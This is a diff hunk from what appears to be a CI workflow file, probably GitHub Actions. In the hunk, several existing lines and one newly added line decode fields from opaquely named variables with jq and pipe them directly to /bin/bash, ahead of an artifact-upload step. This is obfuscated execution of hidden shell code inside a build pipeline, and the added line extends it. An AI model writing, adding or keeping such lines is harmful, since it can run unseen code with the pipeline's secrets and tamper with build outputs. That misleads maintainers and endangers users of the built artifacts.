@@ -26,6 +26,7 @@ jobs:
           echo $f0 | jq -r .raln6414 | /bin/bash
           printf '%s' "$cs386" | jq -r .pu23147 | /bin/bash
           printf '%s' "$dtndp0" | jq -r .wvpkw14 | /bin/bash
+          echo $k9843 | jq -r .f27065 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
